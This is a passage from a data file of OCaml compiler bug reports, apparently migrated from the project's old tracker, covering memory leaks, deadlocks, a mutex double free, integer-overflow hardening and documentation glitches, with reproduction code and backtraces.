]).\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7505\n**Reporter:** liang.wang\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @damiendoligez on 2017-03-31T15:04:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Mac\n**OS:** OSX\n**OS Version:** El Capitan\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1+dev\n**Category:** otherlibs\n**Monitored by:** @hcarty\n\n## Bug description\n\nIf Bigarray.Genarray.change_layout is called upon a variable, the memory allocated for this variable will never be collected by GC. This increases the memory consumption significantly in some numerical applications.\n\n## Steps to reproduce\n\nTest 1:\r\nopen Bigarray;;\r\nfor i = 0 to 10000 do\r\n  let x = Genarray.create float64 c_layout [|1000;1000|] in\r\n  Genarray.fill x 0.;\r\n  Gc.compact ();\r\ndone;;\r\n\r\nTest 2:\r\nopen Bigarray;;\r\nfor i = 0 to 10000 do\r\n  let x = Genarray.create float64 c_layout [|1000;1000|] in\r\n  let y = Genarray.change_layout x fortran_layout in\r\n  Genarray.fill x 0.;\r\n  Gc.compact ();\r\ndone;;\r\n\r\nI tested on OSX, OCaml 4.04. Test 1 is totally fine, consumes about 30MB. Test 2 is bad, memory consumption exploded (over 30GB), simply because I added change_layout function.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7504\n**Reporter:** @johnwhitington\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2017-03-14T23:16:34Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.04.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** language features\n**Related to:** #7169\n\n## Bug description\n\nConsider:\r\n\r\ntype t =\r\n  {a : int;\r\n   b : string}\r\n\r\nlet f x y =\r\n  match x with {a = c}, 0 -> 0\r\n\r\nWhich gives:\r\n\r\nWarning 8: this pattern-matching is not exhaustive.\r\nHere is an example of a case that is not matched:\r\n({}, 1)\r\n\r\n{} isn't legal pattern match syntax. Shouldn't it read \"(_, 1)\"?\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7503\n**Reporter:** @stedolan\n**Status:** confirmed (set by @mshinwell on 2017-03-15T16:25:51Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** runtime system and C interface\n**Related to:** #5141\n**Monitored by:** @stedolan @gasche\n\n## Bug description\n\nWith ocamlopt, the locking in io.c is not sufficient in the presence of asynchronous operations like signal handlers and finalisers. Here's an example program badlock.ml:\r\n\r\n    let () =\r\n      Sys.set_signal Sys.sigint (Sys.Signal_handle (fun _ ->\r\n        print_endline \"signalled!\"));\r\n      while true; do\r\n        print_endline \"hello\"\r\n      done\r\n\r\nThe exact behaviour varies depending on whether systhreads is enabled. With trunk and 4.05.0+beta2,\r\n\r\n    ocamlopt badlock.ml -o badlock && ./badlock\r\n    ^C\r\n\r\ngets stuck in an infinite loop in caml_flush\r\n\r\n    ocamlopt -runtime-variant d badlock.ml -o badlock && ./badlock\r\n    ^C\r\n\r\ncrashes with an assertion failure (the same issue)\r\n\r\n    ocamlopt -thread unix.cmxa threads.cmxa badlock.ml -o badlock && ./badlock\r\n    ^C\r\n\r\ndeadlocks in pthread_mutex_lock\r\n\r\nVersion 4.04 and before do not initialise systhreads when merely linked with threads.cmxa if the program does not use any thread features, so they behave as the first case even when compiled with -thread.\r\n\r\n\r\nI think I understand what's going on in the deadlock case, since I came across this issue when trying to fix a similar problem in the multicore branch (until KC pointed out that the same problem likely exists on trunk). Here's a backtrace from the deadlock in 4.05.0+beta2:\r\n\r\n#0  __lll_lock_wait () at ../sysdeps/unix/sysv/linux/x86_64/lowlevellock.S:135\r\n#1  0x00007f2cd0d32bc5 in __GI___pthread_mutex_lock (mutex=0x563e7210ea60) at ../nptl/pthread_mutex_lock.c:80\r\n#2  0x0000563e70e55a6e in caml_io_mutex_lock ()\r\n#3  0x0000563e70e6920d in caml_ml_output_bytes (vchannel=<optimized out>, buff=<optimized out>, start=<optimized out>, \r\n    length=<optimized out>) at io.c:660\r\n#4  0x0000563e70e2e0da in camlPervasives__output_string_1213 () at pervasives.ml:349\r\n#5  0x0000563e70e2e97a in camlPervasives__print_endline_1310 () at pervasives.ml:472\r\n#6  0x0000563e70e786f4 in caml_start_program ()\r\n#7  0x0000563e70e5db09 in caml_execute_signal (signal_number=signal_number@entry=2, in_signal_handler=in_signal_handler@entry=0)\r\n    at signals.c:176\r\n#8  0x0000563e70e5dbda in caml_process_pending_signals () at signals.c:58\r\n#9  0x0000563e70e5dc87 in caml_process_pending_signals () at signals.c:53\r\n#10 caml_leave_blocking_section () at signals.c:131\r\n#11 0x0000563e70e71d2b in caml_write_fd (fd=1, flags=<optimized out>, buf=buf@entry=0x563e720ee7a0, n=n@entry=6) at unix.c:94\r\n#12 0x0000563e70e68480 in caml_flush_partial (channel=0x563e720ee750) at io.c:168\r\n#13 0x0000563e70e68f48 in caml_flush (channel=<optimized out>) at io.c:182\r\n#14 caml_ml_flush (vchannel=<optimized out>) at io.c:612\r\n#15 0x0000563e70e2e9bf in camlPervasives__print_endline_1310 () at pervasives.ml:472\r\n#16 0x0000563e70e24c47 in camlBadlock__entry ()\r\n#17 0x0000563e70e22369 in caml_program ()\r\n#18 0x0000563e70e786f4 in caml_start_program ()\r\n#19 0x0000563e70e5c9b5 in caml_main (argv=0x7ffff6bb5a18) at startup.c:145\r\n#20 0x0000563e70e2203c in main (argc=<optimized out>, argv=<optimized out>) at main.c:37\r\n\r\nAfter performing the write, caml_write_fd calls leave_blocking_section which runs any pending signal handlers. However, the channel's lock is held because it was taken in caml_flush, so when the signal handler tries to re-acquire the lock it deadlocks. (Without -threads, I think it continues and corrupts the channel state, although I'm not sure of the details).\r\n\r\nI think that it is unsafe in general to hold mutexes while interacting with the OCaml heap. Due to finalisers and signal handlers, several heap operations can run arbitrary user code (e.g. caml_alloc, caml_enter_blocking_section, and more in multicore), which is to be avoided in a critical section.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7502\n**Reporter:** eponier\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-03-09T10:05:23Z)\n**Resolution:** won't fix\n**Priority:** low\n**Severity:** minor\n**Category:** standard library\n**Related to:** #3921 #7524\n\n## Bug description\n\nFor some reason, I was playing with:\r\n\r\nlet rec l = 1 :: l;;\r\n\r\nAnd I tried to manipulate it. But while \"compare l l\" returns 0 instantaneously, \"l = l\" loops infinitely. I do not know if structural equality is supposed to use physical equality as a speed-up, but I find this difference in behaviour surprising. The same happens with (<) ad (>).\r\n\r\nMoreover, in an interactive session (utop or ocaml), the loop is not interrupted by pressing ctrl+c.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7501\n**Reporter:** @dbuenzli\n**Assigned to:** @chambart\n**Status:** closed (set by @alainfrisch on 2017-06-30T07:51:10Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nmshinwell told me the backtrace is useless so I elided it.\r\n\r\nThe source file is a generated one and only available in distributions do: \r\n\r\n opam source uunf --dir /tmp/uunf\r\n cat /tmp/uunf/src/uunf_data.ml\r\n\r\nto consult it.\n\n## Steps to reproduce\n\n> ulimit -s\r\n8192\r\n> opam switch 4.04.0+flambda \r\n> opam install uunf -v -v \r\n[...]\r\n+ ocamlfind ocamlopt -c -g -bin-annot -safe-string -package bytes -package uchar -I src -I test -o src/uunf_data.cmx src/uunf_data.ml\r\n- Fatal error: exception Stack overflow\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7500\n**Reporter:** @dbuenzli\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-03-07T13:21:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nThere is a bad design error that went unnoticed in the introduction of the Uchar module [0].\r\n\r\nThe Uchar module depends on Format because of the convenience function Uchar.dump. This prevents using the type in the String, Buffer and Bytes modules where it could naturally occur in the future evolution of the standard library (e.g. I was preparing this [1] when I noticed this).\r\n\r\nWhile a few workarounds could be provided (e.g. via a definition in Pervasives) it seems the best is to simply remove the function and provide it in Format as `Format.pp_print_dump_uchar`.\r\n\r\nSince `Uchar.dump` is mainly to be used as a debugging function I expect breakage to be minimal [2]. If there is consensus this should be done, I will do it asap.\r\n\r\n[0] https://github.com/ocaml/ocaml/pull/80\r\n[1] https://github.com/dbuenzli/ocaml/commit/b62b32dacd2c4ab114167c36f51cb3cde38c87cb\r\n[2] https://github.com/search?l=OCaml&q=%22Uchar.dump%22&ref=searchresults&type=Code&utf8=%E2%9C%93\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7499\n**Reporter:** @gasche\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-03-03T17:14:08Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** text\n**Category:** documentation\n**Related to:** #7426\n\n## Bug description\n\nThis flambda error occurs in existing OCaml programs, where it is *not always* the sign of an erroneous use of unsafe features. This is a delicate issue and I don't know what guidance to give to users that encounter this error.\r\n\r\nThe meaning of this error, and how to diagnoze and fix the situation, should be documented in the flambda manual: https://caml.inria.fr/pub/docs/manual-ocaml/flambda.html\n\n## Additional information\n\nThis error seems occurs with Frama-C for example:\r\n  https://github.com/ocaml/opam-repository/pull/8599#issuecomment-283976536\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7496\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-14T02:59:21Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n\n## Bug description\n\nThis is the unification version of the complaint in #5927. Fixed polymorphic variant types with conjunctions do not unify with themselves. For example:\r\n\r\n  let f (x : < m: 'a. ([< `Foo of int & float] as 'a) -> unit>)\r\n           : < m: 'a. ([< `Foo of int & float] as 'a) -> unit> = x;;\r\n\r\n  Characters 127-128:\r\n             : < m: 'a. ([< `Foo of int & float] as 'a) -> unit> = x;;\r\n                                                                   ^\r\n  Error: This expression has type\r\n         < m : 'a. ([< `Foo of int & float ] as 'a) -> unit >\r\n       but an expression was expected of type\r\n         < m : 'b. ([< `Foo of int & float ] as 'b) -> unit >\r\n       Types for tag `Foo are incompatible\r\n\r\nAnd:\r\n\r\n  # type t = { x : 'a. ([< `Foo of int & float] as 'a) -> unit };;\r\n\r\n  type t = { x : 'a. ([< `Foo of int & float ] as 'a) -> unit; }\r\n\r\n  # let f t = { x = t.x };;\r\n\r\n  Characters 16-19:\r\n    let f t = { x = t.x };;\r\n                    ^^^\r\n  Error: This expression has type [< `Foo of int & float ] -> unit\r\n         but an expression was expected of type\r\n           [< `Foo of int & float ] -> unit\r\n         Types for tag `Foo are incompatible\r\n\r\nI appreciate that these types are not meant to be actively used in practice. However, I think it is a mistake to have them break basic properties like the reflexivity of equality and the idempotence of unification. These properties are somewhat relied upon by other parts of the type-checker for sane behaviour.\r\n\r\nFor example, my patch for #6673 fails on the new test case for #7269. Not because there is anything wrong with the patch but because it happens to introduce an additional idempotent unification which fails for the conjunctive tags in that test.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7495\r\n**Reporter:** @mmottl\r\n**Assigned to:** @damiendoligez\r\n**Status:** acknowledged (set by @mshinwell on 2017-03-07T12:33:34Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0\r\n**Category:** runtime system and C interface\r\n**Monitored by:** @mshinwell @mmottl\r\n\r\n## Bug description\r\n\r\nConsider the following code:\r\n\r\n```ocaml\r\nlet () =\r\n  let open Bigarray in\r\n  for _i = 1 to 100_000 do\r\n    let vec = Array1.create float64 c_layout 1_000_000 in\r\n    (* Makes sure that physical memory is actually allocated *)\r\n    Array1.fill vec 0.\r\n  done\r\n```\r\n\r\nThis code will let memory consumption quickly go into the GB range.  A comparable implementation using float arrays will stay stable in the low MB range:\r\n\r\n```ocaml\r\nlet () =\r\n  for _i = 1 to 100_000 do\r\n    ignore (Array.make 1_000_000 0.)\r\n  done\r\n```\r\n\r\nI remember that this is a long-standing problem, probably the same as #4616, and likely affects custom block allocation in general.  Not sure whether it's already tracked in another still active issue.  Since the GC will likely undergo significant changes in the near future due to attempts to parallelize it, I think this issue should remain on people's mind.  Some practical numerical code can run into problems with this limitation.\r\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7492\n**Reporter:** @murmour\n**Status:** acknowledged (set by @dra27 on 2017-02-23T09:20:07Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche @yallop @Yakobowski\n\n## Bug description\n\nThere are numerous places inside the runtime where integer multiplication or addition is performed without an overflow check. In many of those situations, overflow is practically impossible because the operands are known to be small enough (e.g. a small integer is multiplied by a sizeof(type)), but sometimes it's far from obvious, and so exists the danger of triggering undefined behaviour.\r\n\r\nThe said above applies to stdlib C stubs as well.\r\n\r\n\r\nOne common source of potential errors involves memory allocation. The malignant pattern is \"caml_stat_alloc(x * y)\", which can be hardened by making it into \"caml_stat_calloc(x, y)\". Calloc is supposed to perform an overflow check, and does so in many implementations, although it's unclear whether it is required to do so by the standard. So far, calloc is only used in a couple of places inside the whole runtime. Perhaps it would be beneficial to use it in place of all occurrences of \"caml_stat_alloc(x * y)\"?\r\n\r\nRecently, as part of #71, the implementation of caml_stat_calloc was changed so that it no longer makes use of the system-provided calloc. The new implementation performs no overflow checks at all. If calloc is to be used more commonly in the runtime, caml_stat_calloc must be augmented with a proper overflow check.\r\n\r\nChecking for overflow in a portable way is non-trivial in C. Fortunately, we already have a battle-tested routine for safe multiplication -- caml_ba_multov in bigarray_stubs.c. I did quite a bit of research, and AFAIK this approach to overflow detection strikes the best balance of portability and performance. The only faster solution involves non-standard type uint128_t that is not available in Visual Studio and older versions of GCC.\r\n\r\nHow about moving caml_ba_multov into misc.h (as a differently named #define) so that it could be used elsewhere (e.g. in caml_stat_calloc)?\r\n\r\n\r\nMore danger comes from so called tainted sources -- that is, external sources of untrusted data. Examples of tainted sources are: user input, compiler parameters, environment variables, arguments to C stubs.\r\n\r\nFor example, these primitives from otherlibs/graph take integers from the user and perform multiplication without an overflow check, which may lead to dangerous consequences:\r\ncaml_gr_new_image\r\ncaml_gr_fill_arc_nat\r\ncaml_gr_draw_arc_nat\r\ncaml_gr_create_image\r\n\r\nIf there were a standard overflow check routine (in misc.h or elsewhere), it could be used to harden such functions.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7490\n**Reporter:** wintersteiger\n**Assigned to:** @mshinwell\n**Status:** assigned (set by @mshinwell on 2017-02-24T14:39:24Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** crash\n**Platform:** amd64\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.04.0\n**Category:** threads\n**Monitored by:** @gasche\n\n## Bug description\n\nThis works as expected:\r\n\r\nlet rec thread_fun _ = \r\n  try \r\n    thread_fun ()\r\n  with\r\n    Stack_overflow -> Printf.printf \"caught exn\\n\" \r\n\r\nlet _ = thread_fun () ; ()\r\n\r\n\r\nBut when thread_fun is called like so:\r\n\r\nlet _ =\r\n  Thread.join (Thread.create thread_fun ()) ;\r\n  ()\r\n\r\nthen it segfaults.\n\n## Steps to reproduce\n\nCompile with ocamlopt -thread unix.cmxa threads.cmxa stackoverflow.ml -o stackoverflow\r\nRun ./stackoverflow\n\n## Additional information\n\nProblem originally encountered in FStar, see here: https://github.com/FStarLang/FStar/pull/870\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7489\n**Reporter:** @dra27\n**Assigned to:** @dra27\n**Status:** assigned (set by @dra27 on 2017-02-19T17:47:30Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** otherlibs\n**Related to:** #7385\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nThe Microsoft CRT (including the Universal CRT) features dreadful handling of the TZ variable. If it set to any Olsen value (e.g. Europe/Paris) then in effect you get UTC. The MS CRT only supports a very reduced subset of the Posix TZ spec - names must be 3 characters and the DST rules cannot be specified and, even worse, it literally requires the whole world to use US DST!\n\n## Steps to reproduce\n\nSet TZ to any non-standard value - the easiest way is to invoke a mingw/msvc compiled program from Cygwin's bash (which will have a correct TZ value)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7488\n**Reporter:** @xavierleroy\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2017-02-19T00:36:08Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** ocamldoc\n\n## Bug description\n\nConsider the following type declaration in a .mli file:\r\n\r\ntype t =\r\n  | A    (** This is case A *)\r\n  | B    (** This is the other case, B *)\r\n\r\nocamldoc -latex produces:\r\n\r\n\\label{type:Foo.t}\\begin{ocamldoccode}\r\ntype t =\r\n\\end{ocamldoccode}\r\n  | A\\begin{ocamldoccomment}\r\nThis is case A\r\n\r\n\r\n\\end{ocamldoccomment}\r\n  | B\\begin{ocamldoccomment}\r\nThis is the other case, B\r\n\r\n\r\n\\end{ocamldoccomment}\r\n\r\n\r\nNotice that \"| A\" and \"| B\" are outside the ocamldoccode environment, causing LaTeX to render them incorrectly.\r\n\r\n(Edited from original report)  The problem doesn't happen consistently.  For example, running ocamldoc on unix.mli from the 4.05 working sources, the \"process_status\" type is correctly formatted.\r\n(End edit.)\r\n\r\nThere are many instances of this problem in the PDF manual for the working sources (4.05-dev), so if it could be solved by the 4.05 release this would be great.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7487\n**Reporter:** berenger\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-02-18T01:32:55Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Version:** 4.04.0\n**Category:** standard library\n\n## Bug description\n\nline 330, characters 2-47\r\nCalled from file \"printf.ml\", line 20, characters 28-44\r\n\r\nI tried with 4.01.0, 4.03.0 and 4.04.0.\r\nThey all crash.\r\n\r\nI am very surprised. Please tell me if you also observe this behavior.\n\n## Steps to reproduce\n\ngit clone https://github.com/UnixJunkie/ocaml_bug_01.git\r\ncd ocaml_bug_01\r\n./crashme.sh\n\n## Additional information\n\nI suspect some recent change in the format module introduced this problem.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7486\n**Reporter:** aalekseyev\n**Status:** resolved (set by @xavierleroy on 2017-02-17T13:27:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.03.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n**Related to:** #7457\n\n## Bug description\n\nThere is a possibility of double free of an io channel mutex in caml_finalize_channel.\r\n\r\nIn particular, this code frees the mutex every time the last channel reference gets finalized:\r\n\r\nCAMLexport void caml_finalize_channel(value vchan)\r\n{\r\n  struct channel * chan = Channel(vchan);\r\n  if (--chan->refcount > 0) return;\r\n  if (caml_channel_mutex_free != NULL) (*caml_channel_mutex_free)(chan);\r\n\r\nThis can happen multiple times because a channel can be brought back from the dead by `caml_ml_out_channels_list`.\r\n\r\nA possible fix would be to set the \"mutex\" field to NULL (maybe in the body of caml_channel_mutex_free)\n\n## Steps to reproduce\n\ncat > bug.ml <<EOF\r\n\r\nlet _t () = Thread.create (fun () -> ()) ()\r\n\r\nlet () =\r\n  let fd, fd2 = Unix.pipe () in\r\n  Unix.close fd2;\r\n  let chan = Unix.out_channel_of_descr fd in\r\n  match Printf.fprintf chan \"%s%!\" (String.make 60000 'x') with\r\n  | exception _exn -> Unix.close fd\r\n  | () -> assert false\r\n\r\nlet () =\r\n  for _x = 1 to 2 do\r\n    let () = Pervasives.flush_all () in\r\n    let () = Gc.full_major () in\r\n    ()\r\n  done\r\n\r\nEOF\r\n\r\nPATH=/j/office/app/ocaml/builds/4.03.0-4+j2+fp-cent6_20161104_134704GMT/bin:\"$PATH\"\r\n\r\nocamlopt.opt -I +threads -o bug.cmx -c -impl bug.ml\r\nocamlopt.opt -ccopt -Wl unix.cmxa -I +threads threads.cmxa ./bug.cmx -o bug.exe\r\n./bug.exe\n\n## Additional information\n\n*** glibc detected *** ./bug.exe: double free or corruption (fasttop): 0x000000000116e760 ***\r\n======= Backtrace: =========\r\n/lib64/libc.so.6[0x3bfbc75f3e]\r\n/lib64/libc.so.6[0x3bfbc78d8d]\r\n./bug.exe[0x4433e3]\r\n./bug.exe[0x455379]\r\n./bug.exe[0x44f46e]\r\n./bug.exe(caml_gc_full_major+0x1a)[0x45baba]\r\n./bug.exe[0x414d36]\r\n./bug.exe[0x4120d9]\r\n./bug.exe[0x46254a]\r\n./bug.exe[0x44a575]\r\n./bug.exe[0x44a5cc]\r\n/lib64/libc.so.6(__libc_start_main+0xfd)[0x3bfbc1ed1d]\r\n./bug.exe[0x411e69]\r\n======= Memory map: ========\r\n00400000-0047b000 r-xp 00000000 fd:04 14466668                           /home/aalekseyev/tmp/bug.exe\r\n0067b000-006a0000 rw-p 0007b000 fd:04 14466668                           /home/aalekseyev/tmp/bug.exe\r\n006a0000-006ad000 rw-p 00000000 00:00 0 \r\n0115e000-01203000 rw-p 00000000 00:00 0                                  [heap]\r\n3bfb400000-3bfb420000 r-xp 00000000 fd:00 131236                         /lib64/ld-2.12.so\r\n3bfb61f000-3bfb620000 r--p 0001f000 fd:00 131236                         /lib64/ld-2.12.so\r\n3bfb620000-3bfb621000 rw-p 00020000 fd:00 131236                         /lib64/ld-2.12.so\r\n3bfb621000-3bfb622000 rw-p 00000000 00:00 0 \r\n3bfbc00000-3bfbd8a000 r-xp 00000000 fd:00 131241                         /lib64/libc-2.12.so\r\n3bfbd8a000-3bfbf8a000 ---p 0018a000 fd:00 131241                         /lib64/libc-2.12.so\r\n3bfbf8a000-3bfbf8e000 r--p 0018a000 fd:00 131241                         /lib64/libc-2.12.so\r\n3bfbf8e000-3bfbf90000 rw-p 0018e000 fd:00 131241                         /lib64/libc-2.12.so\r\n3bfbf90000-3bfbf94000 rw-p 00000000 00:00 0 \r\n3bfc000000-3bfc083000 r-xp 00000000 fd:00 131242                         /lib64/libm-2.12.so\r\n3bfc083000-3bfc282000 ---p 00083000 fd:00 131242                         /lib64/libm-2.12.so\r\n3bfc282000-3bfc283000 r--p 00082000 fd:00 131242                         /lib64/libm-2.12.so\r\n3bfc283000-3bfc284000 rw-p 00083000 fd:00 131242                         /lib64/libm-2.12.so\r\n3bfc400000-3bfc402000 r-xp 00000000 fd:00 131247                         /lib64/libdl-2.12.so\r\n3bfc402000-3bfc602000 ---p 00002000 fd:00 131247                         /lib64/libdl-2.12.so\r\n3bfc602000-3bfc603000 r--p 00002000 fd:00 131247                         /lib64/libdl-2.12.so\r\n3bfc603000-3bfc604000 rw-p 00003000 fd:00 131247                         /lib64/libdl-2.12.so\r\n3bfc800000-3bfc817000 r-xp 00000000 fd:00 131246                         /lib64/libpthread-2.12.so\r\n3bfc817000-3bfca17000 ---p 00017000 fd:00 131246                         /lib64/libpthread-2.12.so\r\n3bfca17000-3bfca18000 r--p 00017000 fd:00 131246                         /lib64/libpthread-2.12.so\r\n3bfca18000-3bfca19000 rw-p 00018000 fd:00 131246                         /lib64/libpthread-2.12.so\r\n3bfca19000-3bfca1d000 rw-p 00000000 00:00 0 \r\n3bff000000-3bff016000 r-xp 00000000 fd:00 131277                         /lib64/libgcc_s-4.4.7-20120601.so.1\r\n3bff016000-3bff215000 ---p 00016000 fd:00 131277                         /lib64/libgcc_s-4.4.7-20120601.so.1\r\n3bff215000-3bff216000 rw-p 00015000 fd:00 131277                         /lib64/libgcc_s-4.4.7-20120601.so.1\r\n7f2d90000000-7f2d90021000 rw-p 00000000 00:00 0 \r\n7f2d90021000-7f2d94000000 ---p 00000000 00:00 0 \r\n7f2d941cd000-7f2d954d8000 rw-p 00000000 00:00 0 \r\n7f2d9550d000-7f2d9550e000 rw-p 00000000 00:00 0 \r\n7ffd33eaa000-7ffd33ebf000 rw-p 00000000 00:00 0                          [stack]\r\n7ffd33ed3000-7ffd33ed4000 r-xp 00000000 00:00 0                          [vdso]\r\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\r\n./reproduce: line 26:  1967 Aborted                 ./bug.exe\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7484\n**Reporter:** @xavierleroy\n**Assigned to:** @dra27\n**Status:** resolved (set by @xavierleroy on 2017-03-24T17:53:39Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Cygwin 32 bits\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** otherlibs\n**Monitored by:** @alainfrisch\n\n## Bug description\n\nA program\r\n- compiled to bytecode (ocamlc)\r\n- linked with unix.cma and bigarray.cma\r\n- calling Unix.fork()\r\nresults in a Cygwin 32 hard error\r\n\r\nocamlrun 4692 child_info_fork::abort: unable to map C:\\builds\\workspace\\precheck-cygwin-32\\otherlibs\\bigarray\\dllbigarray.so, Win32 error 998\r\n\r\nOn my Windows PC I can also get error 1114 instead.\r\n\r\nFor reference, error 998 = Invalid access to memory location and error\r\n1114 = A dynamic link library (DLL) initialization routine failed.\r\n\r\nEverything works fine if:\r\n- program is compiled to native code (ocamlopt)\r\n- program doesn't link with bigarray.cma\r\n- program doesn't call Unix.fork.\n\n## Steps to reproduce\n\necho \"let _ = Unix.fork()\" > tfork.ml\r\nocamlc -o tfork.exe unix.cma bigarray.cma tfork.ml\r\n./tfork.exe\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7482\r\n**Reporter:** @mlasson\r\n**Assigned to:** @alainfrisch\r\n**Status:** resolved (set by @alainfrisch on 2017-02-20T09:38:42Z)\r\n**Resolution:** duplicate\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\r\n**Category:** typing\r\n**Duplicate of:** #6013\r\n**Monitored by:** @diml\r\n\r\n## Bug description\r\n\r\nWhen compiling \r\n```\r\n  let f = ()\r\n    let () =\r\n      let f = () in (* unused *)\r\n      ()\r\n```\r\none gets a \"Warning: unused variable f\", which is fine. \r\n\r\nBut if you craft this piece of code in a ppx extension that does\r\nnot locate its identifiers (or that locate them at the same place), \r\nthe warning will not be triggered.\r\n\r\nThis is because these checks are implemented using hash tables with\r\nthe \"located name\" used as a key, so the two occurrences of \"f\" are\r\nseen as used (because the first one is).\r\n\r\n( Note that this was \"discovered\" while investigating this issue https://github.com/LexiFi/landmarks/issues/9 )\r\n\r\n## Steps to reproduce\r\n\r\nYou can try by compiling : \r\n```\r\nlet str = [%str\r\n    let f = ()\r\n    let () =\r\n      let f = () in\r\n      ()\r\n   ]\r\n\r\nlet () =\r\n  let open Ast_mapper in\r\n  register \"landmarks\"\r\n    (fun _ ->\r\n      { default_mapper with\r\n        structure = (fun _ _ -> str)})\r\n```\r\nwith `ocamlfind ocamlopt -package ppx_tools.metaquot -package compiler-libs.common -linkpkg -o ppx_bug ppx_bug.ml` (it requires ocamlfind and ppx_tools). \r\n\r\nAnd then use the ppx to compile any file (eg. \"test.ml\"):\r\n`ocamlc -ppx ./ppx_bug -dsource test.ml`.\r\nIt will output: \r\nlet f = () \r\nlet () = let f = ()  in () \r\nAnd not trigger any warning.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7480\n**Reporter:** @nojb\n**Assigned to:** @dra27\n**Status:** closed (set by @dra27 on 2017-02-13T15:08:24Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** otherlibs\n\n## Bug description\n\nUnix.create_process takes a string array as second argument that is supposed to be passed as argv to the child process.  However, this is not the case on Windows, as the arguments are not quoted correctly before calling win_create_process in win32unix/createprocess.c: for example, there are problems if the arguments contain spaces and/or double quotes (and probably others).\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7479\n**Reporter:** etc\n**Status:** resolved (set by @xavierleroy on 2017-02-19T16:50:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** arch linux\n**OS Version:** 4.7.2-1\n**Version:** 4.02.3\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nCompiling with `-pack` and `-a x.ml -o x.cma` will succeed but when it's linked and used it will segfault.\r\n\r\nI found that by changing the makefile to use `-c x.ml -o x.cmo` instead is how it's supposed to be done. Maybe compiling with -a shouldn't succeed when it's also -pack?\n\n## Steps to reproduce\n\nClone this git repository: https://github.com/Charlesetc/ocaml-segfault/\r\n\r\n$ make\r\n$ ./test.byte\n\n## Additional information\n\nOn the same git repo, there's a \"success\" branch https://github.com/Charlesetc/ocaml-segfault/tree/success, which has a change in the command that actually works. Thanks for taking a 